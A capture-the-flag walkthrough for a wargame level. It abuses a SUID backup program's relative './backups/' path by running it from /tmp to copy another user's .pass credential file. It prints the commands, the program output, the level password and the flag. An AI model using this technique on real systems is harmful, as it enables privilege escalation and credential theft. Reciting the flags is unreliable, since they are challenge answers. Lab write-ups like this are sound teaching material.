# Walkthrough

## 1. Download the binary

```bash
scp -P 2222 level08@localhost:~/level08 .
# Password: 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

## 2. Analyze with Ghidra

Open the binary in Ghidra and examine the `main` and `log_wrapper` functions.

## 3. Understand the program flow

**Program behavior:**
1. Takes a filename as command-line argument
2. Opens a log file at `./backups/.log`
3. Opens the source file (from argument) for reading
4. Creates backup path: `./backups/` + filename
5. Copies the file byte-by-byte to the backup location
6. Logs the operation completion

## 4. Check for SUID privileges

```bash
ssh level08@localhost -p 2222
# Password: 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

ls -la ~/level08
```

**Output:**
```
-rwsr-s---+ 1 level09 users 12975 Sep 10 2016 level08
```

**Key observation:**
- `s` in permissions = SUID bit set
- Binary runs with `level09` privileges
- Can read files owned by `level09`, including `.pass`

## 5. Identify the relative path vulnerability

**Critical code:**
```c
strncpy(backup_path, "./backups/", 11);
strncat(backup_path, argv[1], 99 - strlen(backup_path));
```

**The vulnerability:**
- Uses `./backups/` (relative to current working directory)
- If we run from `/tmp`, `./backups/` points to `/tmp/backups/`
- No absolute path validation
- We can control where the backup is written!

## 6. Create controlled directory structure

```bash
cd /tmp
mkdir -p backups/home/users/level09
```

**Why this works:**
- Binary will try to write to: `./backups/` + `/home/users/level09/.pass`
- Result: `./backups//home/users/level09/.pass`
- Since we're in `/tmp`, this becomes: `/tmp/backups/home/users/level09/.pass`

## 7. Execute the exploit

```bash
~/level08 /home/users/level09/.pass
```

**What happens:**
1. Binary runs with `level09` privileges (SUID)
2. Opens `/home/users/level09/.pass` for reading (succeeds with SUID)
3. Creates backup at `./backups//home/users/level09/.pass` (our controlled directory)
4. Copies the password file to our accessible location

**Output:**
```
LOG: Starting back up: /home/users/level09/.pass
LOG: Finished back up /home/users/level09/.pass
```

## 8. Verify the backup was created

```bash
ls -la /tmp/backups/home/users/level09/
```

**Output:**
```
total 12
drwxrwxr-x 2 level08 level08 4096 Feb 13 10:30 .
drwxrwxr-x 3 level08 level08 4096 Feb 13 10:30 ..
-rw-rw---- 1 level08 level08   41 Feb 13 10:30 .pass
```

## 9. Read the flag

```bash
cat /tmp/backups/home/users/level09/.pass
```

**Output:**
```
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

## 10. Flag

```
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
